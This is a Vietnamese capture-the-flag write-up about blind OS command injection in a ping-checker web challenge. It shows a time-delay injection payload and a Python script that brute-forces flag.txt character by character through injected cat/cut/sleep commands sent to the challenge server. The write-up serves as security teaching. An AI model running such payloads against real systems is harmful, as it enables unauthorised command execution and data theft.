## Task
 ![](https://hackmd.io/_uploads/H1n58dRoh.png)

Qua việc nhìn tên đề bài mình có thể đoán được rằng bài này sẽ được khai khác bằng **command injection**

# Recon

 ![](https://hackmd.io/_uploads/rk6ND_Rj3.png)

- Ở ngay trang đầu tiên ta có thể thấy được rằng trang web này sẽ cho phép người dùng kiểm tra kết nối với một trang web sử dụng lệnh **ping** nhưng khi ta thử

- ![](https://hackmd.io/_uploads/BkGAwOAj2.png)

- Vậy ta có thể thấy rằng thay vì in ra output như bình thường thì nó lại in ra thông báo hệ thống đang được bảo trì và đang ngắt kết nối mạng nhưng khi ta thử những payload khác
 ![](https://hackmd.io/_uploads/HkWL__Aon.png)
- Ta có thể thấy được rằng các payload không hề bị filter nên là ta có thể thoải mái thực hiện các payload khác nhau nhưng không nhìn thấy kết quả vậy ta phải làm thế nào
- Khi mở source code lên ta có thể thấy bất kể chúng ta làm gì đi chăng nữa thì ta vẫn sẽ nhận được dòng thông báo là đang bảo trì server do biến output đã bị thay đổi khi kết thúc hàm **index()**
 ![](https://hackmd.io/_uploads/SyQpa_Rsn.png)

# Exploit
- Đầu tiên ta phải có một cách nào để chắc chắn rằng mọi câu lệnh ta chạy vào bên trong đều được thực hiện nhưng làm thế nào để biết được rằng các câu lệnh đã được chạy và được thực thi? Đây chính là lúc mà ta thực hiện [**Blind OS command injection with time delay**](https://www.youtube.com/watch?v=KbWn4L2dcHU&ab_channel=RanaKhalil) 
- Khái quát một chút ta sẽ sử dụng độ trễ của server phản hồi để chắc chắn rằng chúng ta đang thực hiện một câu lệnh "OS"
- Đầu tiên ta sẽ thử với payload như sau```hostname=; sleep 5;``` sử dụng burp suite để có thể quan sát kỹ hơn 
 ![](https://hackmd.io/_uploads/HyfmoOCoh.png)
- Ta có thể thấy request bị trả về với khoảng thời gian là  ![](https://hackmd.io/_uploads/SyO_iu0o3.png)
- Vậy làm thế nào để có thể đọc được file flag.txt đây ta sẽ viết một file script để lấy flag nói cách khác chính là **bruteforce** 
- Để có thể build được một file script thì ta cần hai thứ thứ nhất chính là làm thế nào để biết được các ký tự có trong file flag.txt sử dụng câu lệnh **OS** thứ hai làm thế nào để có thể in ra được ký tự đó và nhận về kết quả cuối cùng
- Ta sẽ sử dụng lệnh **cut** và lệnh **cat** để có thể làm được điều đó
 ![](https://hackmd.io/_uploads/HyHGpuAo2.png)
- Câu lệnh này có nghĩa là đọc file **api.py** rồi cut lấy ký tự đầu tiên của file **api.py**
- Vậy là ta có cách để có thể lấy được ký tự đầu tiên của file giờ là làm thế nào để có thể in nó ra một cách chính xác và sử dụng time delay để lấy được flag
- Nhưng như ta đã biết việc in ra kết quả của biến output là không thể khi mà biến output đã biến đổi thành đoạn văn bản ta không cần vậy làm thế nào để có thể chạy được script đây
- Ta đến hướng thứ hai chính là việc sử dụng **if else** trong bash để có thể thứ nhất là so sánh với ký hiệu được **cat** ứng với ký tự gì trong bản chữ cái và ta sẽ sử dụng câu lệnh sau
 ![](https://hackmd.io/_uploads/HkWLfKAjn.png)
- Ta có thể hiểu câu lệnh trên đang lấy ký tự đầu rồi so sánh với chữ "i" nếu giống nhau thì in ra 'same' nếu không thì in ra 'not same' vạy nếu như ta thay bằng sleep thì sao nếu như giống thì sleep 2 giây không giống thì không sleep
- Vậy giờ khi đã có trong tay hướng đi sao ta không bắt đầu vào code nhỉ?
 ```python=
import requests
import time 

CHARSET = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_.{}-' # dùng để bruteforce

URL = 'http://34.130.180.82:59119/' # url của đề bài

FLAG = ''

proxies={"http":"http://127.0.0.1:8080"} #localhost

for index in range(1,50):
    print("[DEBUG] Đang bruteforce kí tự thứ ", index)
    for c in CHARSET:
        # Đây là payload exploit
        # Nếu đúng thì tui cho nó ngủ 2s
        # Nếu sai thì không ngủ
        INJECT = "; cmd=`cat flag.txt | cut -c {vitri}`; if [ $cmd = '{bruteforce}' ]; then sleep 2; else sleep 0; fi; #".format(
            vitri=index,
            bruteforce=c
        )
        # Sử dụng phương thức POST để có thể gửi dữ liệu đến url
        r = requests.post(URL, {'hostname': INJECT},proxies=proxies)
        thoi_gian_phan_hoi = r.elapsed.total_seconds()
        # Thì khi kết quả HTTP trả về, nó sẽ lưu vào .text của biến r
        #print("Tui đang thử kí tự thứ ",index," nè: ", c, "(time:",thoi_gian_phan_hoi,")")
        if thoi_gian_phan_hoi > 2:
            FLAG += c
            print("Tìm ra kí tự thứ ", index, "là ", c, "(FLAG:",FLAG,")")
            break

 ```
# Flag
 ![](https://hackmd.io/_uploads/HyH2mKAoh.png)

